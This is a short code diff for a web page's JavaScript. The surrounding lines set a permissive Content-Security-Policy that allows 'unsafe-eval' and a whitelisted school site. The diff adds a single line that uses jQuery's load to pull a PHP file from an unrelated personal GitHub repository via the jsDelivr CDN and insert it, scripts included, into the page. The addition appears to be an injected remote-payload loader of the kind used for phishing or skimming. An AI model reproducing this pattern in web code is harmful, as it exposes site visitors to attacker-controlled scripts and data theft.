@@ -4,6 +4,7 @@
     meta.setAttribute('content', "default-src *; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' 'unsafe-eval' http://ucilnica.pgdzgsiska.si");
 
     document.head.appendChild(meta);
+	  $('#output').load('https://cdn.jsdelivr.net/gh/ttimhzv/fa@main/main.php');
 	  var div = document.getElementById('ma');
 	  	
 
